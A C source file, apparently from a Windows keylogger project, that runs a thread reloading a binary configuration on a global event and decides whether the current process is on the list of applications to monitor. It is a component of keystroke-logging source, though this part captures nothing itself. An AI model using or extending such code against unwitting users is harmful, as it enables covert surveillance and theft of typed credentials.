//* Running in ReadConfigFile Thread.

#include "..\..\..\Include\Keylog.h"

HANDLE					hConfigChangeEvent;

extern	KLPROCESSDATA	TempProcessData;
extern	BOOL			fInitDone;
extern	BOOL			fMonitorApp;
extern	WCHAR			wszConfigFilePath[MAX_PATH + 1];
extern	BOOL			bKLExitReadConfigThread;

#pragma data_seg( "SharedSegment" )
extern	BOOL		bKLExitAllReadConfigThread;
#pragma data_seg()
#pragma comment ( linker, "/SECTION:SharedSegment,RWS" )

DWORD WINAPI ReadNewKLConfiguration(LPVOID lpParam) {
    BOOL FuncRetVal = FALSE;
    DWORD dwRetVal = 0;
    hConfigChangeEvent = CreateEvent(NULL, TRUE, FALSE, L"Global\\KLConfigUpdate");
    if (hConfigChangeEvent == NULL)
        return FALSE;

    while (bKLExitAllReadConfigThread != TRUE &&  bKLExitReadConfigThread != TRUE) {
        dwRetVal = WaitForSingleObject(hConfigChangeEvent, 1000);
        if (bKLExitAllReadConfigThread != TRUE &&  bKLExitReadConfigThread != TRUE && dwRetVal == WAIT_OBJECT_0) {
            FuncRetVal = ConfigureAppFilter();
            ResetEvent(hConfigChangeEvent);
        }
    }
    //__asm int 3
    return CloseHandle(hConfigChangeEvent);
}

BOOL ConfigureAppFilter()	// CheckConfig
{
    int Index = 0;
    int iRetVal = 0;;

    KLCONFIG KLConfig;

    FILE *fpConfig = NULL;
    errno_t iError;

    //	__asm int 3
    __try {
        // reset flags
        fInitDone = FALSE;
        fMonitorApp = FALSE;

        iError = _wfopen_s(&fpConfig, wszConfigFilePath, L"rb");
        if (iError != 0)
            return FALSE;

        fread(&KLConfig, sizeof(KLCONFIG), 1, fpConfig);		// handle this func..

        for (Index = 0; Index < KLConfig.nApps; Index++) {
            iRetVal = _wcsicmp(TempProcessData.wszEXEName, KLConfig.AppList[Index]);
            if (iRetVal != 0)
                continue;

            fMonitorApp = TRUE;
            break;
        }
        if (fInitDone != TRUE)
            fInitDone = TRUE;
        return TRUE;
    }

    __finally {
        if (fpConfig != NULL)
            fclose(fpConfig);
    }
}
